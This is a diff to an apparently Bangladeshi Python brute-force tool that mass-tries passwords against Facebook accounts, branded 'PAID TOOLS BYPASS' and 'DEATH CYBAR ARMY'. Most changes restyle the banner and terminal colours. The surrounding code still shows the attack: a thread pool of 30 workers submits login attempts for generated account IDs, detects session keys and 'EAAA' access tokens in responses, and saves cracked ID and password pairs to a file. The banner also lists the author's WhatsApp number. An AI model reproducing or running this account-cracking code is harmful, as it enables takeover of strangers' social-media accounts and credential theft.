@@ -59,7 +59,6 @@ logo = ("""\033[1;31m
 
  
 
-█
 ██████╗░░░░░█████╗░░░░░█████╗░
 ██╔══██╗░░░██╔══██╗░░░██╔══██╗
 ██║░░██║░░░██║░░╚═╝░░░███████║
@@ -71,20 +70,21 @@ logo = ("""\033[1;31m
                                  V:2.0
  \033                            
  
-  🔥 PAID TOOLS BYPASS BY Tan-Vai🔥
+  ☠️ PAID TOOLS BYPASS BY Tan-Vai ☠️
 ________________________________________
+  OWNER    : DEATH CYBAR ARMY
  
   Github   :  Tan-Vai
   
-  whatsapp  : 01843598985
+  whatsapp : 01843598985
 
   Facebook : Abu Tanim
   
   Description : IT'S A BYPASS TOOLS
   
-   🔥 TOOLS QUALITY NOT BAD.TRY IT 🔥
+   ☠️ TOOLS QUALITY NOT BAD.TRY IT ☠️
   
-     🔥🔥 BYPASS BY Tan-Vai 🔥🔥
+     ☠️ BYPASS BY Tan-Vai ☠️
 ________________________________________\033[1;37m""")
 class Main:
 	def __init__(self):
@@ -116,9 +116,9 @@ class Main:
 				__ = idx
 				self.id.append(__+str(_))
 			#print(self.id)
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\033[0;93m [+] TOTAL ID -> \033[1;31m%s\033[1;32m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;32m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
@@ -156,17 +156,17 @@ class Main:
 			#print(response.text)
 			#sys.exit()
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ D.C.A] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ D.C.A] %s | %s\033[1;31m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
 				open(okc,"a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ D.C.A ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ D.C.A ] %s | %s\033[1;31m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open(okc,"a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
-				#print("\r \033[0;92m[ BYPASS-CHECK ] %s | %s\033[0;97m         "%(uid, pw))
+				#print("\r \033[0;92m[ BYPASS-CHECK ] %s | %s\033[1;31m         "%(uid, pw))
 				continue
 
 		self.loop +=1
